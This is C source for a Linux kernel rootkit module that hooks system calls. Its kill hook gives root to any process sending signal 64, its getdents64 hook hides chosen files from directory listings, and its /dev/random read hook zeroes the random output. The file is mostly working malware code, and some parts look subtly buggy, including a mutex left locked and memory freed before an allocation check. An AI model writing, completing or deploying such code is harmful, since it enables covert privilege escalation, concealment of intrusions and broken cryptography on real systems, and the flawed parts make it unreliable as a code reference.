#include "hooks.h"

uint8_t SU_SIGNAL = 64;

char** HIDDEN_FILES = NULL;
u32 HIDDEN_NUM = 0;
DEFINE_MUTEX(hidden_files_mutex);

asmlinkage long (*orig_kill)(const struct pt_regs *);
asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage ssize_t (*orig_random_read)(
    struct file *file, char __user *buf,
     size_t nbytes, loff_t *ppos
     );


bool add_hidden_file(char* filename) {
    u32 i;
    u32 len;
    char* buffer;

    mutex_lock(&hidden_files_mutex);
    for (i = 0; i < HIDDEN_NUM; i++) {
        if (strcmp(HIDDEN_FILES[i], filename) == 0) {
            mutex_unlock(&hidden_files_mutex);
            return true;
        }
    }

    len = strlen(filename);
    buffer = kmalloc(len+1, GFP_KERNEL);
    if (!buffer) {
        mutex_unlock(&hidden_files_mutex);
        return false;
    }
    memcpy(buffer, filename, len);
    buffer[len] = '\0';

    char** new_hidden_files = kmalloc(sizeof(char*) * (HIDDEN_NUM + 1), GFP_KERNEL);
    if (!new_hidden_files) {
        kfree(buffer);
        mutex_unlock(&hidden_files_mutex);
        return false;
    }

    for (i = 0; i < HIDDEN_NUM; i++) {
        new_hidden_files[i] = HIDDEN_FILES[i];
    }
    new_hidden_files[HIDDEN_NUM] = buffer;
    HIDDEN_NUM++;
    kfree(HIDDEN_FILES);
    HIDDEN_FILES = new_hidden_files;

    mutex_unlock(&hidden_files_mutex);

    return true;
}


bool remove_hidden_file(char* filename) {
    u32 i;
    u32 len;
    u32 file_index;
    char* buffer;

    mutex_lock(&hidden_files_mutex);
    file_index = HIDDEN_NUM;
    for (i = 0; i < HIDDEN_NUM; i++) {
        if (strcmp(HIDDEN_FILES[i], filename) == 0) {
            file_index = i;
            break;
        }
    }
    if (file_index == HIDDEN_NUM) {
        mutex_unlock(&hidden_files_mutex);
        return false;
    }


    char** new_hidden_files = kmalloc(sizeof(char*) * (HIDDEN_NUM - 1), GFP_KERNEL);
    kfree(HIDDEN_FILES[file_index]);
    if (!new_hidden_files) {
        mutex_unlock(&hidden_files_mutex);
        return false;
    }
    for (i = 0; i < file_index; i++) {
        new_hidden_files[i] = HIDDEN_FILES[i];
    }
    for (i = file_index; i < HIDDEN_NUM - 1; i++) {
        new_hidden_files[i] = HIDDEN_FILES[i+1];
    }

    HIDDEN_NUM--;
    kfree(HIDDEN_FILES);
    HIDDEN_FILES = new_hidden_files;
    mutex_unlock(&hidden_files_mutex);

    return true;

}



void set_root(void) {
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = 0;
    root->gid.val = 0;
    root->euid.val = 0;
    root->egid.val = 0;
    root->suid.val = 0;
    root->sgid.val = 0;
    root->fsuid.val = 0;
    root->fsgid.val = 0;

    commit_creds(root);
}


asmlinkage long hook_kill(const struct pt_regs* regs) {
    int sig = regs->si;

    if (sig == SU_SIGNAL)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
    }

    return orig_kill(regs);
}


asmlinkage int hook_getdents64(const struct pt_regs *regs)
{

    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *) regs->si;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    u32 i;


    int len = orig_getdents64(regs);
    if (len <= 0 || HIDDEN_NUM == 0) {
        return len;
    }
    if (!mutex_trylock(&hidden_files_mutex)) {
        return len;
    }
    dirent_ker = kzalloc(len, GFP_KERNEL);


    if (!dirent_ker) {
        mutex_unlock(&hidden_files_mutex);
        return len;
    }

 
    if (copy_from_user(dirent_ker, dirent, len) != 0) {
        kfree(dirent_ker);
        mutex_unlock(&hidden_files_mutex);
        return len;
    }


    while (offset < len)
    {
        current_dir = (void *)dirent_ker + offset;

        for (i = 0; i < HIDDEN_NUM; i++) {
            if (strcmp(HIDDEN_FILES[i], current_dir->d_name) != 0) {
                previous_dir = current_dir;
                offset += current_dir->d_reclen;
                continue;
            }
            if (!previous_dir) {
                len -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, len);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
            offset += current_dir->d_reclen;
        }

    }


    if (copy_to_user(dirent, dirent_ker, len) != 0) {
        kfree(dirent_ker);
        mutex_unlock(&hidden_files_mutex);
        return -EFAULT;
    }
    kfree(dirent_ker);
    mutex_unlock(&hidden_files_mutex);
    return len;

}


asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int len;
    u32 i;
    long error;
    char *buffer;

    len = orig_random_read(file, buf, nbytes, ppos);

    if (!mutex_trylock(&random_mutex) || len < 0) {
        return len;
    }

    if (!random_switched) {
        return len;
    }

    buffer = kzalloc(len, GFP_KERNEL);

    if (!buffer) {
        mutex_unlock(&random_mutex);
        return len;
    }
    
    if (copy_from_user(buffer, buf, len) != 0) {
        kfree(buffer);
        mutex_unlock(&random_mutex);
        return len;
    }

    for (i = 0 ; i < len ; i++)
        buffer[i] = '\0';

    if (copy_to_user(buf, buffer, len) != 0) {
        kfree(buffer);
        mutex_unlock(&random_mutex);
        return len;
    }

    kfree(buffer);
    mutex_unlock(&random_mutex);
    return len;
}